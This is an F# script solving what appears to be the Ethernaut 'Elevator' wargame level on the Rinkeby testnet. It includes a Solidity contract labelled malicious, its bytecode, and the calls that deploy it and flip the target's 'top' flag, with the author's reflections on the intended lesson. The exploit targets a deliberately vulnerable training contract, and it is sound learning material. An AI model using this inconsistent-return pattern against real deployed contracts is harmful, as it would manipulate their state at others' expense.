#i """nuget: C:\Users\jon_h\source\repos\web3\web3.fs\bin\Release\"""
#r "nuget: web3.fs, 0.2.1" 

open web3.fs

// Values and partial applications
let env =createWeb3Environment "http://127.0.0.1:1248" "2.0" "0x2268b96e204379ee8366505c344ebe5cc34d3a46"

let call = makeEthCall env
let txn = makeEthTxn env

// use the webpage to deploy an instance, so that when we submit we get the blurb

// This clear condition was strange and not as well expressed as the others have been. Essentially, it's saying that I can't get `bool top` to 
// equal true. And that "Sometimes Solidity is not good at keeping promises" which .... no idea what that means in this context.

// I gather that just changing the bool is enough, and the lesson is that you should be careful about expressing business logic in untrusted
// contracts? Not sure.

// Malicious contract:

(*
    // SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract MyBuilding is Building {
    
    address elevator = 0x2A2F2D9205198028a67CF2047494CbBADF95b219;
    uint256 floor;

    function isLastFloor(uint256 _floor) external override returns (bool) {
        if ( _floor != floor) {
          floor = _floor;
          return false;
        }
        else {return true;}
        
    }

    function callGoTo(uint256 _floor) public {
       elevator.call(abi.encodeWithSignature("goTo(uint256)", _floor));
    }
}
*)

let level11ABI = """[{"inputs":[{"internalType":"uint256","name":"_floor","type":"uint256"}],"name":"callGoTo","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_floor","type":"uint256"}],"name":"isLastFloor","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]""" |> ABI
//let level11Bytecode = """6080604052732a2f2d9205198028a67cf2047494cbbadf95b2196000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561006457600080fd5b5061026d806100746000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c80631d3dc26f1461003b5780635f9a4bca14610069575b600080fd5b6100676004803603602081101561005157600080fd5b81019080803590602001909291905050506100ad565b005b6100956004803603602081101561007f57600080fd5b8101908080359060200190929190505050610212565b60405180821515815260200191505060405180910390f35b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681604051602401808281526020019150506040516020818303038152906040527fed9a7134000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040518082805190602001908083835b602083106101a55780518252602082019150602081019050602083039250610182565b6001836020036101000a0380198251168184511680821785525050505050509050019150506000604051808303816000865af19150503d8060008114610207576040519150601f19603f3d011682016040523d82523d6000602084013e61020c565b606091505b50505050565b6000600154821461022d578160018190555060009050610232565b600190505b91905056fea26469706673582212205f1bd654543300b8a6b7d268aab62909f552750ec43fdacc6d40e96c1e875ff064736f6c634300060c0033""" |> RawContractBytecode

//prepareUndeployedContract env level11Bytecode None RINKEBY level11ABI
//|> Result.bind (deployEthContract env ZEROV )
//|> env.log Log

// my contract address 0x34a9af1573305c03c85589360bbcde626466d441

// check the current status of the top bool
let elevatorABI = """[{"inputs":[],"name":"floor","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"_floor","type":"uint256"}],"name":"goTo","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"top","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"}]""" |> ABI
let elevator = loadDeployedContract env "0x2A2F2D9205198028a67CF2047494CbBADF95b219" RINKEBY elevatorABI |> bindDeployedContract |> List.head
call elevator (ByString "top") [] 
|> env.log Log

// [+] Call result: [Bool false]

let attack =  loadDeployedContract env "0x34a9af1573305c03c85589360bbcde626466d441" RINKEBY level11ABI |> bindDeployedContract |> List.head

txn attack (ByString "callGoTo") [Uint256 "1"] ZEROV
|> env.log Log

call elevator (ByString "top") [] 
|> env.log Log

// [+] Call result: [Bool true]

// Apparently, I solved this level completely wrong
// The blurb read as follows:
// > You can use the view function modifier on an interface in order to prevent state modifications. The pure modifier also prevents 
// > functions from modifying the state. Make sure you read Solidity's documentation and learn its caveats.

// > An alternative way to solve this level is to build a view function which returns different results depends on input data but 
// don't modify state, e.g. gasleft().

// I can't make heads or tails of this, and the compiler bitches at me when I attempt to use `view` on the overridden function from 
// the Building interface...so no idea. Peeking at the Openzeppelin contract answers, their solution is a slightly more elegant 
// version of my own...
